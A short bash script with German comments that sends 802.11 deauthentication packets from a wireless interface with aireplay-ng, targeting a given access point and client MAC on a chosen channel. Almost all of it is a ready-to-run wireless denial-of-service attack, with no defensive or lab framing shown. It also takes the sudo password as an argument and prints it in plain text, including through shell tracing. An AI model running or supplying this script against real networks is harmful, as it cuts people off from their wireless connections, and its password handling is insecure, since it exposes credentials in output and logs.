#!/bin/bash

set -x

INTERFACE="$1"       # z.B. wlan0
AP_MAC="$2"          # BSSID des AP, z.B. AA:BB:CC:DD:EE:FF
CLIENT_MAC="$3"      # MAC des Clients, z.B. 11:22:33:44:55:66
CHANNEL="$4"         # Kanal, z.B. 36
PACKETS="${5:-100}"  # Anzahl Deauth-Pakete, Default 100
SECRET="$6"          # sudo-Passwort

echo "----------------------------------------"
echo "----------------------------------------"
echo "----------------------------------------"
echo "----------------------------------------"
echo "Interface: $INTERFACE"
echo "AP MAC: $AP_MAC"
echo "Client MAC: $CLIENT_MAC"
echo "Channel: $CHANNEL"
echo "Packets: $PACKETS"
echo "Secret: $SECRET"
echo "----------------------------------------"
echo "----------------------------------------"
echo "----------------------------------------"
echo "----------------------------------------"

if [[ -z "$INTERFACE" || -z "$AP_MAC" || -z "$CLIENT_MAC" || -z "$CHANNEL" || -z "$SECRET" ]]; then
echo "Usage: $0  <ap_mac> <client_mac>  [packets] "
exit 1
fi


if ! ip link show "$INTERFACE" &>/dev/null; then
echo "Interface $INTERFACE nicht gefunden"
exit 1
fi


#echo "[i] Deaktiviere Interface $INTERFACE"
#echo "$SECRET" | sudo -S ip link set "$INTERFACE" down###

#echo "[i] Setze Monitor-Mode auf $INTERFACE"
#echo "$SECRET" | sudo -S iw dev "$INTERFACE" set type monitor 
#echo "$SECRET" | sudo -S ip link set "$INTERFACE" up#

echo "[i] Deaktiviere Energiesparen"
echo "$SECRET" | sudo -S iw dev "$INTERFACE" set power_save off || true

echo "[i] Setze Interface $INTERFACE auf Kanal $CHANNEL"
echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL" 
sleep 1

echo "[i] Sende $PACKETS Deauth-Pakete von $CLIENT_MAC an $AP_MAC auf Kanal $CHANNEL"
echo "$SECRET" | sudo -S aireplay-ng -0 "$PACKETS" -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"

exit 0